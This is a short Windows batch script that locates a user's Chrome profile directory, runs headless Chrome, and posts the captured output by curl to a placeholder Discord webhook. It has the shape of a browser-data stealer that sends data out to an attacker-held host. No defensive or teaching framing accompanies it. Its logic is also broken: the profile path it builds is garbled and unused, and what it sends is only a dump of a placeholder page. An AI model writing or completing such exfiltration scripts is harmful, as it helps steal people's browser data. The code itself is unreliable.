@echo off
setlocal enabledelayedexpansion
set "ChromiumPath=C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
set "UserDataDir=%LOCALAPPDATA%\Google\Chrome\User Data"
set "Profile=%UserDataDir%\Default"
for /f "tokens=*" %%a in ('dir /b /ad "%UserDataDir%"') do (
    set "Profile=!Profile!%%a"
)
for /f "delims=" %%a in ('"%ChromiumPath%" --headless --disable-gpu --dump-dom "data:text/plain,PleaseWait" 2^>^&1') do (
    set "ChromiumInfo=%%a"
)
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Chromium info: %ChromiumInfo%\"}" YOUR_DISCORD_WEBHOOK_URL_HERE
pause
